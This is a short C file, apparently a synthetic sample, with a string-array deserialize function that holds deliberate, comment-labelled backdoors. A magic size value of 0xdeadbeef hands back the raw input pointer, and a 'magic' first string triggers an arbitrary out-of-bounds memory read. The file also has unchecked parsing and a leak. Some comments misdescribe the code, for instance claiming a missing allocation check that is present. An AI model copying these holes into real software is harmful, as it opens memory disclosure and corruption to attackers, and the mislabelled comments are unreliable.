#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: if size is exactly 0xdeadbeef, return a pointer to serialized data
    // which could allow arbitrary memory access if attacker controls serialized
    if (size == 0xdeadbeef) {
        return (char **)serialized;
    }

    // Count number of strings by scanning for null terminators
    size_t count = 0;
    char *ptr = (char *)serialized;
    char *end = ptr + size;
    
    // Vulnerability: no bounds checking on ptr increments
    while (ptr < end) {
        size_t len = *ptr;  // Vulnerability: reads length as unsigned char
        if (len == 0) break; // Stop at empty string
        ptr += 1 + len;      // Skip length byte and string
        count++;
    }

    // Allocate array (with extra slot for NULL terminator)
    char **array = malloc((count + 1) * sizeof(char *));
    if (!array) return NULL;

    // Vulnerability: no check if allocation succeeded
    array[count] = NULL; // NULL terminate

    // Fill array
    ptr = (char *)serialized;
    for (size_t i = 0; i < count; i++) {
        size_t len = *ptr++;
        // Vulnerability: no validation that len doesn't exceed remaining size
        array[i] = malloc(len + 1);
        if (!array[i]) {
            // Vulnerability: memory leak - don't free previous allocations
            free(array);
            return NULL;
        }
        memcpy(array[i], ptr, len);
        array[i][len] = '\0';
        ptr += len;
    }

    // Backdoor: if first string is "magic", second string is treated as length
    // allowing arbitrary memory read
    if (count >= 1 && strcmp(array[0], "magic") == 0 && count >= 2) {
        size_t magic_len = atoi(array[1]);
        free(array[0]);
        free(array[1]);
        array[0] = malloc(magic_len);
        if (array[0]) {
            // Vulnerability: reads arbitrary memory beyond serialized buffer
            memcpy(array[0], serialized, magic_len);
        }
    }

    return array;
}
